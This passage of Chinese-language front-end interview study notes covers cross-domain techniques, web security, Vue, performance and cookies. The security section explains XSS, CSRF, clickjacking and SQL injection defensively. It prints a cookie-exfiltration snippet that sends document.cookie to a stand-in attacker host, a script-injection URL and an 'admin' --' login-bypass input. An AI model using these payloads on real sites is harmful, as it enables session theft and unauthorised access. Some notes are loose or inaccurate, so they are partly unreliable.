			    else if (window.attachEvent) {
			      el.attachEvent(type, handler)
			    } else {
			      el[`on${type}`] = handler
			    }
			  },
			  removeHandler (el, type, handler) {
			    if (window.removeEventListener) {
			      el.removeEventListener(type, handler, false)
			    } 
			    else if (window.detachEvent) {
			      el.detachEvent(type, handler)
			    } else {
			      el[`on${type}`] = null
			    }
			  }
			}
		
		
		(2) 事件委托：通过事件冒泡把所点击的元素代理在他的父元素上
		
		      原由：1. 给很多重复的元素绑定点击事件是很浪费空间的的呐! 因为每个函数都是对象
		  	       2. 关键是!!动态添加元素不会绑定点击事件				


		(2) window 事件
		     event 并不会包含任何信息，兼容 dom 浏览器 event.target = document

					      
					      
					      
	
九、跨域
	同源策略：限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互
	
	  协议+端口号+域名要相同：否则很容易被 XSS、CSRF 等攻击
	
	无法读取非同源网页的 --> 协议 + 端口跨域问题，前台无能为力..
	
	  (1) 页面对象「DOM」 √
	  (2) Cookie、LocalStorage 和 IndexedDB √
	  (3) 无法发送 AJAX [请求可以发出去啊!!，但浏览器拒绝接受响应] √
          (4) <iframe>元素遵守同源政策 [父子窗口通信] √
	
	
	
	原理：敲黑板!!! 在 html 页面中再通过相应的标签从不同域名下加载静态资源，被浏览器允许 
	
	       -- <img>、<link>、<script> 允许跨域加载资源
	     
	
	1、jsonp跨域 [只能解决 get 一种请求, 容易受到 xss 攻击]
	
	   通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上
	
	
	   原理：利用 <script> 标签没有跨域限制，可以得到从其他源动态产生的 JSON 数据
	
		步骤： 1.创建 <script src='跨域的地址?callback=cb'> /*声明一个cb函数，函数名作为参数传递*/
		      2.服务器接受到该请求后，将cb()与数据拼接为字符串 cb(data)
		      3.response -- 执行cb()
		
		
		原生实现：
		 (1) 脚本：     
			var script = document.createElement('script');
			script.src = 'http://www.domain2.com:8080/login?callback=cb';
			document.head.appendChild(script);

			// 回调执行函数
			function handleCallback(res) {
			  alert(JSON.stringify(res));
			}
			
		(2)一定需要跨域服务器的支持：
		
			handleCallback({"status": true, "user": "admin"})
			
		栗子：多个jsonp请求回调函数同名 [自己封装一个jsonp函数]
		
			function jsonp({ url, params, callback }) {
			  return new Promise((resolve, reject) => {
			    let script = document.createElement('script')
			    window[callback] = function(data) {
			      resolve(data)/*链式执行*/
			      document.body.removeChild(script)
			    }
			    
			    params = { ...params, callback }/*转换为对象属性*/
			    let arrs = []
			    for (let key in params) {
			      arrs.push(`${key}=${params[key]}`)/*location.search*/
			    }
			    script.src = `${url}?${arrs.join('&')}`
			    document.body.appendChild(script)
			  })
			}
			jsonp({
			  url: 'http://localhost:8080/',
			  params: { name: 'xy' },
			  callback: 'cb'
			}).then(data => {
			  // 操作..
			})
	
	
	2、CORS [浏览器会自动进行 CORS 通信，关键是服务器。只要服务器实现了 CORS，就实现了跨域]
	    
	  原理：
	    1. 同源限制请求可以发出去，只是浏览器拒绝接受响应
	    2. response 有 Access-Control-Allow-Origin 响应头，浏览器将会允许跨域 
	   
	   request 头信息： [发现是跨域请求后自动添加 Origin 请求头]
	     ...
	     Origin/*添加本次请求来自的源*/
	   
	   response 头信息：
	   
	     Access-Control-Allow-
	      Origin、Headers、Methods、Credentials、Max-Age、[Expose-Headers: 允许可以拿到的 response headers]
	      
	     失败：返回正常 http 响应(status code: 200)，浏览器检查没有 Access-Control-Allow-Origin  -> 触发 xhr.onerror()
	      
	
	  (1) 简单请求：
	        method: HEAD | GET | POST 
		
	        请求头: Accept | Accept-Language | Content-Language | 
		
		       Content-Type: application/x-www-form-urlencoded [标准编码] &键值对以=分隔
		                     multipart/form-data [编码为消息]
				     /*<form enctype> -- 表单数据格式*/
				     text/plain [纯文本]
		
	  
	  (2) 复杂请求：正式通信前增加一次增加一次 http 查询请求
	      
	    预检请求：浏览器自动发送 [和缓存一样有新鲜期]
	    
	     request 头信息：
	      
	        OPTIONS /cors HTTP/1.1
		Origin: 
		Access-Control-Request-Method: 跨域请求方法
		Access-Control-Request-Headers: 额外的请求头
	     
	     server 的设置：检查后响应 [cors 响应头]
		
		let express = require('express')
		let app = express()
		let whitList = ['http://localhost:3000'] //设置白名单
		
		app.use(function(req, res, next) {
		  let origin = req.headers.origin
		  
		  if (whitList.includes(origin)) {
		    res.setHeader('Access-Control-Allow-Origin', origin)/*哪个源可以访问*/
		    res.setHeader('Access-Control-Allow-Headers', 'name')/*允许的请求头*/
		    res.setHeader('Access-Control-Allow-Methods', 'PUT')/*允许的访问方法*/
		    res.setHeader('Access-Control-Allow-Credentials', true)/*默认cookie不能跨域*/
		    res.setHeader('Access-Control-Max-Age', 6)/*预检的存活时间*/
		    /*
		      xhreq.getResponseHeader() 只能拿到6个基本字段
		      Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma
		     */
		    res.setHeader('Access-Control-Expose-Headers', 'name')/*允许拿到的响应头*/
		    
		    if (req.method === 'OPTIONS') {/*OPTIONS请求不做任何处理*/
		      res.end() 
		    }
		  }
		  next()
		})
		
     [!!敲黑板啦，很重要] domain + hash + name 跨域原理：
     
	<iframe> -- 满足同源策略 [dom + 存储]
	  
	      （iframe.contentWindow）：子窗口 window [同源才可以获取子窗口内属性]
	      （iframe.parent）：父窗口 window
		
		
	3、document.domain: 主域相同
	   域名设置顺序：紧绷(www.google.com) -> 松散(google.com)
	   ! 反向设置会出错
			
		<iframe src="http://b.xy1.cn:3000/b.html" onload="load()" id="frame"></iframe> 
		document.domain = 'zf1.cn'
		function load() {
		  var frame = document.getElementById('frame')
		  frame.contentWindow.a // 100
		}

		document.domain = 'xy1.cn'/*b.xy1.cn:3000/b.html*/
		var a = 100;
	
	
    	4、iframe + location.hash
	   原理：'#' 后的内容浏览器自动忽略
	
	window.parent：<iframe> 所在父窗口
	
	  (1) 跨域窗口 window.onhashchange 响应数据的变化
	  (2) 代理 <iframe> 通过 window.parent.parent 传递数据	    
	  (3) 释放内存；这也保证了安全（不被其他域frame js访问）
	     
		    function destoryFrame() { 
			iframe.contentWindow.document.open();
			iframe.contentWindow.close();/*window.open()*/
			document.body.removeChild(iframe);
		    }
		    
			
	4、window.name 利用在一个浏览器窗口内，载入所有的域名都是共享一个 window.name，每个页面都有 window.name 读写的权限
	   支持非常长的 name 值（2MB）
	
		(1) 跨域窗口 通过 window.name 传递数据
		(2) iframe.contentWindow.name 获取代理 <iframe> 数据
		
		
   	5、利用 h5 新特性window.postMessage() [古老的异步解决方案]
	
	  window.onmessage = function -- 监听
	
	  postMessage(data, origin, ) -- 调用
	  参数：
	  data「Type：any」：但部分浏览器只支持字符串，所以传参时最好用 JSON.stringify() 序列化。
	  origin「协议+主机+端口号」「*：任意窗口」：可以接受到消息的目标窗口
	
	
	6、nginx反向代理 [cors 原理]
	   反向代理：我们通过第三方服务器访问服务器集群的内容，但是我们并不知道是哪一台服务器提供的内容
	
	   修改 nginx 目录下 nginx.conf/*别忘重启 nginx*/
	
	// proxy服务器
	server {
	    listen       80;
	    server_name  www.domain1.com;
	    location / {
		proxy_pass   http://www.domain2.com:8080;  #反向代理
		proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名，方便当前域cookie写入
		index  index.html index.htm;

		# 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用
		add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*
		add_header Access-Control-Allow-Credentials true;
	    }
	}




十、Web 安全
      无论是 XSS、SQL 注入，原理都是破坏跨层协议的数据/指令的构造
      
        SQL 注入：应用层来说，一句sql是数据（字符串），对于数据库层来说，一句sql是指令
	XSS：对于服务器端来说，html是数据（字符串）；对于浏览器端来说，html是指令
      
      
      1. XSS (Cross-Site Scripting) -- 跨站脚本攻击 [Chrome其内置了一些XSS过滤器，可以防止大部分非持久型 XSS]
      
         所谓“存储型”、“反射型”都是从黑客利用的角度区分的。对于程序员来说意义不大，反而是误导。
	 只有“DOM-based”型略有不同，innerHTML="用户输入" -- 被 xss 攻击
	 
	 
         原理：代码注入 [非法的 html 标签或 Js 进行攻击]
           用户个人信息、cookie 值被窃取 [简易窃取方式如表单提交]
	   
	   

    (1) 反射型 XSS -- 直接的用户输入（通常通过URL参数传递）
          
	服务器未对数据存储，也未经任何过滤就返回给前端，被浏览器渲染，就可能导致 xss 攻击
    
        栗子：给别人发送带有恶意脚本的 url
	
	// 文档中包含的代码
	<select><!-- 1.get 或 post 就可以完成一次攻击 2.用户点击链接被hack -->
	    <script>
		document.write(''
		    + '<option value=1>'
		    +     location.href.substring(location.href.indexOf('default=') + 8)
		    + '</option>'
		);
		document.write('<option value=2>English</option>');
	    </script>
	</select>
	
	// 注入链接攻击
	url: https://x.com/x?default=<script>document.cookie</script> 注入
	
	因为后台未对 url 参数做任何处理，返回给前端，前端直接从 url 上获取参数



    (2) 持久型 XSS [form 表单提交 --- 留言、提交文本信息]
   
        利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。
        [ POST 提交表单 -> 后端没做转义入库 -> 读取库没转义直接给前端 -> 前端拿到数据没转义直接渲染 ]
      
	  如果评论没有任何过滤的话：cookie 发送给攻击者站点：
	   
	     var img = document.createElement('img')
	     img.src='http://www.xss.com?cookie=' + document.cookie
	     img.style.display='none'
	     document.getElementById('#body').appendChild(img)
	     
	
	一些诱因：
	
	  1. 页面渲染的所有内容必须来自于服务端。
	  2. 尽量不要从DOM API 中获取数据直接渲染 [URL，document.referrer，document.forms]
	  3. 尽量不要使用 eval, new Function()，d.write()，setTimeout()，innerHTML等可执行字符串方法
  
	  
	3.如何防御
	
	对于 XSS 攻击来说，通常有两种方式可以用来防御。

	  1) CSP: 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载执行
	     也就是一段代码变成了程序，我们是否应该运行它
	    
	     栗子：设置 HTTP Header
	    
	     Content-Security-Policy: 
	     
	         default-src 'self'/*只允许加载本站资源*/
		 img-src https://* /*只允许加载 HTTPS 协议图片*/
		 child-src 'none' /*允许加载任何来源框架*/

	 2) 从谁到输出都要进行转义 [用户的输入永远不可信任的] 
	 
	    伪造 http 请求直接发送 html 代码就需要前后台一起控制了
		
	      a. 输入：字符串类型的数据，需要针对<、>、/、'、"、& 等字符进行实体化转义
	         输出：文档中 inline-script
	           这明显是考虑不够的，因为只解决了 html 的问题，浏览器不仅可以解析 html，还可以解析 js，而 js 指令构造被破坏的方式和 html
		 是不一样的 [换行、注释（//和/*）、引号]
	      
	      b. 限制 url、post 参数类型
	      c. 
				
		
	   对于显示富文本来说，显然转义所有字符，因为这样会把需要的格式也过滤掉 [可以考虑白名单过滤]
 	      栗子：
		const xss = require('xss')
		let html = xss('<h1>XSS Demo</h1><script>alert("xss");</script>')

	3) HttpOnly Cookie [无法通过 Js 拿到 cookie]
	   

      2. CSRF(Cross Site Request Forgery) [跨站伪造请求] / url 跳转漏洞
      
	 CSRF：它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作
	 

	 原理：http
	
	  (1) 完成 CSRF 攻击必须要有三个条件：

	    a. 用户已经登录了站点 A，并在本地记录了 cookie
	    b. 用户在 cookie 缓存新鲜的情况下，访问了攻击者提供的 Hacked B [请求是用户发起的]
	    c. 站点 A 没有做任何 CSRF 防御 
	  
	    总结一下就是，有用户登录态（cookie 与 sessionId）的第三方网站的代码请求了我们的网站 -> 实际上是用户发起的请求

	(2) 如何防御:

	      a. get 请求不对数据进行修改
	      b. 不让第三方网站访问到用户 Cookie, 或阻止第三方网站请求接口
	      c. 请求时附带验证信息，比如验证码或者 Token
	      
	      cookie SameSite 属性 -- 兼容性 [Cookie 不随着跨域请求发送]
		
		1) http 请求头： referer -- 判断来源
		
		   referer：当前请求页面的来源页面的 url，不是自己的网站就返回错误 [以上，无法全依赖 referer Check 作为防御手段]
		     
		     I.   http 跳转 https，不会发送 referer
		     II.  与该网站同域网站有 xss 漏洞

		    栗子：提交表单 referer 一定是在本站发起的请求 [限制白名单]

		2) Anti CSRF Token -- 添加 token
		
		   在 http 请求中以参数的形式加入一个随机产生的token，
		   
		   并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。

		这种方法相比Referer检查要安全很多，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。
		
		加 token 即同样的随机 token，在 cookies 中放一份，在表单中再放一份。这样第三方网站就无法获取到这个 token 是什么。但是这样做也有一个比较明显的问题，就是无法保证站内用户的体验。虽然你防了站外的攻击，但是也降低了站内用户的体验。具体表现在如果同时打开多个表单，只有最后一个表单能成功提交

		4) 验证码!![是将一种辅助手段，在关键业务点设置验证码]

		     前端和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求 [降低用户体验，不要加太多]

      
      3. 点击劫持
         原理：[opacity：0] 仍会触发绑定事件
	   z-index[设置被攻击层高层级] + opacity: 0
	   
           <iframe> 视觉欺骗将攻击的网站，进行按钮点击时实际点击被攻击页面隐藏按钮 
      
        
五、SQL注入 [万能密码: 本质上就是SQL注入的一种利用方式]

    栗子：post 表单提交数据
	username: admin' -- [提交]
	SELECT * FROM user WHERE username='admin' --' AND psw='xxxx'
	
	1. 参数查询，而不直接拼接查询语句!
	2. <input> 输入限制 -- 正则匹配
	3. 对进入数据库的特殊字符（'，"，\，<，>，&，*，; 等）进行转义处理，或编码转换。
	     基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库


		    

十四、高阶函数：在 Js 中，函数是对象。因此，函数可以将函数作为参数，并且可以由其他函数返回。
     执行此操作的函数称为高阶函数。任何作为参数传递的函数都称为回调函数。
	
	1. 函数作为参数传递 抽离出一部分容易变化的业务逻辑，把这部分业务逻辑放在函数参数中。这样一来可以分离业务代码中变化与不变的部分
		回调函数
	2. 函数作为返回值传递
	
	

二十七、js的阻塞特性：所有浏览器在下载JS的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。
		      直到JS下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。
		      为了提高用户体验，新一代浏览器都支持并行下载JS，但是JS下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。
	css阻塞：因为浏览器会维持html中css和js的顺序，样式表必须在嵌入的JS执行前先加载、解析完。
		 而嵌入的JS会阻塞后面的资源加载，所以就会出现上面CSS阻塞下载的情况。
	




							node面试
一、koa中间件执行机制
	1.添加中间件的方式是使用Koa实例的use方法，并传入一个generator函数，这个generator函数接受一个next参数
	2.use的原理：function Application () {this.middleware = [] // 这个数组就是用来装一个个中间间的}
	3.每次执行use方法，就把外面传进来的generator函数push到middleware数组中
		app.use = function (fn) {this.middleware.push(fn)}
	4.koa中是预先通过use方法，将请求可能会经过的中间间装在一个数组中。
	5.callback函数就是请求到来的时候执行的回调。把装着中间件middleware的数组作为参数传递为compose这个方法。
	6.componse把毫无关系的一个个中间件给收尾串起来了，就好比我们平常的烤面筋
	7.componse将中间件从最后一个开始处理，并一直往前知道第一个中间件。其实最关键的就是将最后一个中间件得到generator
	   作为参数传递给前一个中间件。当最后一个中间件的参数next是空的generator函数生成对象

	中间件是怎么跑起来的：https://juejin.im/post/591c8b4544d904006c90a2cb


二、koa和express的区别
	1.异步流程的控制。express采用callback来处理异步，koa2采用的是async/await
	2.错误处理。express采用callback捕获异常，对深层次的异常捕获不了。koa采用try/catch							


								vue面试
一、介绍下MVVM(数据的双向绑定）
	M: model数据模型
	V: view 界面
	MV:作为桥梁负责沟通view跟model
     只关心数据的流传，减少强耦合性。最关键的就是数据的双向绑定
 关键步骤：1.实现数据监听器Observer，用object.defineProperty()重写数据的get/set。值更新就在set中通知订阅者更新数据
	  2.实现模板编译compile，深度遍历dom树，对每个元素节点的指令模板替换数据以及订阅数据
	  3.实现watch用于连接Observer和compile，能够订阅并接受每一个属性的变动的通知，执行指令绑定的相应的回调函数，从而更新数据

mvc和mvvm其实区别并不大。都是一种设计思想。主要就是mvc中Controller演变成mvvm中的viewModel。mvvm主要解决了mvc中大量的DOM 操作使页面渲染性能降低，
加载速度变慢，影响用户体验。和当 Model 频繁发生变化，开发者需要主动更新到View 。

二、 eventBus vuex
 	原理：eventbus 解决了兄弟组件之间事件传递问题,本质是订阅发布者模式，从而摆脱了兄弟之间需要父组件转而传递的复杂。还有一种方法是vuex数据流，单一状态树,rootState树根
              名词，专车。订阅者跟发布者都引用专车，这个vue实例，来完成订阅发布者。 emit（发布）  on(订阅一个组件)
 npm包	vue-event-proxy

	vuex 是将数据单独的抽离出来，一种状态管理工具，它借鉴的是Flux、redux的基本思想，将转态抽离到全局形成一个store

三、watch:
	对属性进行监听，允许我们执行异步操作，限制我们执行该操作的频率（debounce），并在我们得到结果前，设置中间转态。

四、Vue的双向数据绑定实现原理
	1.核心就是数据劫持 + 发布/订阅者模式：vue使用的是Object.defineProperty()通过监听他的get/set事件，监听对数据的操作，从而触发数据同步

 Object.defineProperty缺陷的：
	1.只能对属性进行数据劫持，并且需要深度遍历整个对象
	2.对于数组不能监听数据的变化
    而proxy原生支持监听数组的变化，并且可以直接对整个对象进行拦截，所有Vue在下个版本中用proxy替换object.defineProperty
    
    钩子的理解？
    其实是翻译造成的问题，原名是“hook”（不负责任的直译为“钩子”而已），它是一种事件劫持机制，也就是说它会比你的事件更早进行执行处理。

你可以简单地把它理解为vue的内置事件，但是这个内置事件是由你去配置的。




五、nextTick原理
 
六、生命周期函数  https://juejin.im/post/5b41bdef6fb9a04fe63765f1
		new Vue（创建一个Vue对象）--> beforeCreate --> observer Data(开始监控data对象数据变化） 
		--> init event(vue内部初始化事件）

		 --> created()  --> compile(编译模板,把data里面的数据和模板生成html) 
		 -->  beforeMount(还没有生成HTML到元素上)  -->
		
		 mounted(挂载完成，也就是模板中的html渲染到了html页面中）  
		 -->  beforeUpdate (Vritual Dom) 
		 --> updated  --> beforeDestroy --> destroyed	
		 

	1.ajax请求最好放在created里面，页面可以访问到this了
	2.关于dom的操作要放在mounted里面，在mounted前面还没有生成dom
	3.每次进入/离开组件都要做一些事情，用什么钩子函数：
		不缓存：进入的时候可以用created和mounted钩子，离开的时候可以使用beforedDestory（可以访问this）和destoryed


		缓存：缓存了组件之后，再次进入组件不会触发beforeCreate，created, beforeMount,mounted
		      如果你想每次进入组件都做一些事情的话，你可以放在activated进入缓存组件的钩子中
七、keep-alive
	在被keep-alive包含的组件/路由，会多出两个生命周期：activated 和 deactivated
	actived在组件第一次渲染时会被调用，之后再每次缓存组件被激活时调用 调用机制：第一次进入缓存路由/组件，在mounted后面，beforeRouteEnter守卫传给 next 的回调函数之前调用：

八、Vue的SPA 如何优化加载速度
	1.减少入口文件体积
	2.静态资源本地缓存
	3.开启Gzip压缩
	4.使用SSR,nuxt.js

九、模块化
	基本概念： 1.在js中，一个模块就是实现特定功能的文件(js文件) 
		   2.遵循模块的机制，想要什么就加载什么模块
		   3.模块化开发需要遵循规范

	js实现模块化规范
		    1.AMD 浏览器  requirejs  模块被异步加载，模块加载不影响后面语句的运行 默认使用baseURL+ paths的路经解析方式
		    2.CommonJS  nodejs  
		    3.ES6的import/export
		    4.CMD 浏览器端 

	解决的问题：1.命名冲突 2.文件依赖 3.模块的复用 4.统一规范和开发方式

十、谈谈Vue和React组件化的思想
	1.我们在各个页面开发的时候，会产生很多重复的功能，比如element中的xxxx。
	像这种纯粹非页面的UI，便成为我们常用的UI组件，最初的前端组件也就仅仅指的是UI组件
	
	2.随着业务逻辑变得越来多是，我们就想要我们的组件可以处理很多事，这就是我们常说的组件化，这个组件就不是UI组件了，而是包具体业务的业务组件
	
	3.这种开发思想就是分而治之。最大程度的降低开发难度和维护成本的效果。并且可以多人协作，每个人写不同的组件，最后像撘积木一样的把它构成一个页面	

十一、vue的依赖收集和watch原理
	


八、为什么虚拟DOM会提高性能 https://www.zhihu.com/question/29504639?sort=created
	虚拟DOM相当于在js和真实dom中间加了一个缓存，利用dom diff算法避免了没有必要的doom操作，从而提高性能
	具体实现步骤：
		·用JavaScript对象结构表示DOM树的结构；然后用这个树构建一个真正的DOM树，插到文档中
	        ·当状态变更的时候，重新构造一棵树的对象树，然后用新的树和旧的树进行对比，记录两棵树差异
		·把2所记录的差异应用到步骤1所构建的真正的DOM树上，试图就更新了。

九、diff算法
	1.把树形结构按照层级分解，只比较同级元素
	2.给列表结构的每个单元添加key属性，方便比较。在实际代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个标记
	3.在深度优先遍历的时候，每遍历到一个节点就把该节点和新的树进行对比。如果有差异的话就记录到一个对象里面
	Vritual DOM 算法主要实现上面步骤的三个函数：element， diff， patch。然后就可以实际的进行使用
	react只会匹配相同的class的component（这里的class指的是组件的名字）
	合并操作，条用component的setState方法的时候，React将其标记为dirty.到每一个时间循环借宿，React检查所有标记dirty的component重新绘制
	4.选择性子树渲染。可以重写shouldComponentUpdate提高diff的性能	

十、super

十一、简述下flux的思想
	flux的最大特点，就是数据的‘单向流动’
	1.用户访问View
	2.View发出用户的Action
	3.Dispatcher收到Action,要求state进行相应的更新
	4.store更新后，发出一个‘change’事件后，更新页面



							
						性能优化

一、webpack打包文件体积过大？（最终打包为一个js文件）
	1.异步加载模块
	2.提取第三库
	3.代码压缩
	4.去除不必要的插件

如何优化webpack构建的性能
	一、减少代码体积 1.使用CommonsChunksPlugin 提取多个chunk之间的通用模块，减少总体代码体积
			 2.把部分依赖转移到CDN上，避免每次编译过程都由Webpack处理
			 3.对一些组件库采用按需加载，避免无用的代码
	二、减少目录检索范围
			 ·在使用loader的时候，通过制定exclude和include选项，减少loader遍历的目录范围，从而加快webpack编译速度
		
	三、减少检索路经：resolve.alias可以配置webpack模块解析的别名，对于比较深的解析路经，可以对其配置alias


二、我们把开发中的所有资源（图片，js、css文件）都看成模块，通过loader和plugins来对资源进行处理，打包成符合生产环节部署的前端资源。
							
三、移动端的性能优化
      1、首屏加载和按需加载，懒加载
      2、资源预加载
      3、图片压缩处理，使用base64内嵌图片
      4、合理缓存dom对象
      5、使用touchstart代替click（click 300毫秒的延迟）
      6、利用transform:translateZ(0)，开启硬件GUP加速
      7、不滥用web字体，不滥用float（布局计算消耗性能），减少font-size声明
      8、使用viewport固定屏幕渲染，加速页面渲染内容
      9、尽量使用事件代理，避免直接事件绑定

四、Vue的SPA 如何优化加载速度
	1.减少入口文件体积
	2.静态资源本地缓存
	3.开启Gzip压缩
	4.使用SSR,nuxt.js

五、移动端300ms延迟
	由来：300毫米延迟解决的是双击缩放。双击缩放，手指在屏幕快速点击两次。safari浏览器就会将网页缩放值原始比例。
	     由于用户可以双击缩放或者是滚动的操作，当用户点击屏幕一次之后，浏览器并不会判断用户确实要打开至这个链接，还是想要进行双击操作
	    因次，safair浏览器就会等待300ms，用来判断用户是否在次点击了屏幕
	解决方案：1.禁用缩放，设置meta标签 user-scalable=no
		  2.fastclick.js
			原理：FastClick的实现原理是在检查到touchend事件的时候，会通过dom自定义事件立即
			      发出click事件，并把浏览器在300ms之后真正的click事件阻止掉
	fastclick.js还可以解决穿透问题

六、页面的重构；在不改变外部行为的前提下，简化结构、添加可读性



					服务器端
					

九、CDN（内容分发网络）
	1.尽可能的避开互联网有可能影响数据传输速度和稳定性的瓶颈和环节。使内容传输的更快更稳定。
	2.关键技术：内容存储和分发技术中
	3.基本原理：广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对的地区或者网络中。当用户访问网络时利用全局负载技术
		    将用户的访问指向距离最近的缓存服务器，由缓存服务器直接相应用户的请求（全局负载技术）



十三、为什么css放在顶部而js写在后面
	1.浏览器预先加载css后，可以不必等待HTML加载完毕就可以渲染页面了
	2.其实HTML渲染并不会等到完全加载完在渲染页面，而是一边解析DOM一边渲染。
	3.js写在尾部，主要是因为js主要扮演事件处理的功能，一方面很多操作是在页面渲染后才执行的。
	  另一方面可以节省加载时间，使页面能够更加的加载，提高用户的良好体验

	但是随着JS技术的发展，JS也开始承担页面渲染的工作。比如我们的UI其实可以分被对待，把渲染页面的js放在前面，时间处理的js放在后面
	


十四、存储方式与传输方式
     因为 http 是无状态连接 [减少服务器的CPU 及内存资源的消耗]
     主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务, HTTP/1.1 引入 Cookie 来保存状态信息
     
	
	cookie被禁用的解决方式：
	  (1) 在页面中插入参数，并且下一次请求时进行参数回传「隐藏表单」
	  (2) url query
	
	
	1. cookie 甜点
	
	   (1) 什么是 cookie？
	       cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端
	       两个请求是否来自同一浏览器。
	    
		a. 发送 cookie
	           当发送http请求时，浏览器会先检查是否有相应的 cookie，存在的话自动添加在请求首部中的 cookie 字段中
	       
	           => 由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）
	       
		b. 本地存储
	           cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段
	       
	           => 新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB
	   	      cookie 渐渐被淘汰
	     
	     
	   (2) 怎么使用 cookie？
	     
	       * **session 管理**：登录信息、购物车信息「需要记录的信息」
	       	 既然 session 还是需要用到 cookie，为什么不直接用 cookie 来识别用户呢？
		 
		 
		  1. 数据复杂性
		       1) Cookie 明文保存，而且只能保存 ASCII 码字符串
		          保存了 sessionId
			  
		       2) session 可以存储任何类型的数据 [服务器端维护会话状态，存储一个sessionId和session的映射关系]
		       
		  2. 禁用 Cookie
		     使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递
		  
		  
	       * 个性化：用户的偏好「css 皮肤」
	       * 追踪：记录分析用户行为
	     
		a. 一些需要记住的特征
	          1) cookie 存储是以域名区分的「不同域 cookie 独立」，同一域下限制 20 个 [domain 可以设置]
		  2) 最大 4KB
		  3) 安全性问题
		  4) 访问的局限性 [遵循同源策略，可以设置 domain、path]
		  
	  
	   (3) 创建过程
		Cookie 是响应报与请求报文首部字段，以下
		
		  * Set-Cookie(简写)：响应报文包含 Set-Cookie 首部字段
		  * Cookie(简写)：请求报文 Cookie 首部字段
	
		a. Set-Cookie
		   服务器设置 Set-Cookie，客户端得到响应报文后把 Cookie 内容保存到浏览器中。

		      HTTP/1.0 200 OK
		      Content-type: text/html
		      Set-Cookie: yummy_cookie=choco [值存储的才是真正的数据]
		      Set-Cookie: tasty_cookie=strawberry

		b. 发送 Cookie 
		   客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 发送给服务器

		      GET /sample_page.html HTTP/1.1
		      Host: www.example.org
		      Cookie: yummy_cookie=choco; tasty_cookie=strawberry
		      
		   不向服务器发送 Cookie
		      window.navigator.cookieEnabled = false


	   (4) Cookie 的属性
	
		a. expires
		   指定 Cookie 过期时间（Expires）或有效期（max-age）
		   * 省略 expires [会话期 Cookie]

		   栗子：Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;


		b. 作用域 [domain]
		   Domain 标识指定了哪些主机可以接受 Cookie
		   * 默认：当前文档主机（不包含子域名）
		   * domain: 包含子域名 [www.google.com]
		   
		   栗子：Domain=mozilla.org;，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。


		c. Path [path]
		   标识指定了主机下的哪些路径可以接受 Cookie。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
		   
		   栗子：www.google.com 设置路径为 Path=/dlm;, 只有访问 www.google.com/dlm 及其子路径时才会生效


		d. HttpOnly
		   HttpOnly 的 Cookie 不能被 Js 脚本调用「document、xhr、request API 都无法拿到该属性」

		   => 跨站脚本攻击 (XSS) 常常使用 Js 的 document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度
		      上避免 XSS 攻击。
		 
	      Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly


		e. Secure
		   Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端

		   => 但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实		      的安全保障
		   
		   栗子：secure;
	         

	3. Js
	   a. 浏览器 document.cookie 属性
	      1. 创建新的 Cookie 2. 访问非 HttpOnly 标记的 Cookie

		      document.cookie = "yummy_cookie=choco";/*注意不是覆盖，而是添加!*/
		      document.cookie = "tasty_cookie=strawberry";
		      console.log(document.cookie); 
		      // => yummy_cookie=choco;tasty_cookie=strawberry
	      
	   b. 不向服务器发送 Cookie
	   
	     	 window.navigator.cookieEnabled = false

	      
	      
	     (3) 一些操作
	     cookie 由 http 协议生成，也要提供 http 协议使用!
	     
	     客户端：「Cookie 字段可包含多个 cookie，';'分隔」
	     
	     1) window.navigator.cookieEnabled // 浏览器是否打开 cookie 功能
	        document.cookie // 当前网页 cookie
	     
	     
	     2) 更改 cookie：必须匹配「上一个 cookie」所有存在字段
	     
	     
	2. Session
	   服务器端存储了一些必须的用户信息，这部分存在服务器端的用户信息就叫做session
	    
	     * 可以存储在服务器上的文件、数据库或者内存中
   	     * 集群有时候也要考虑 Session 的转移，在大型的网站，一般会有专门的 Session服务器集群，用来保存用户会话，这个时候 Session 信息
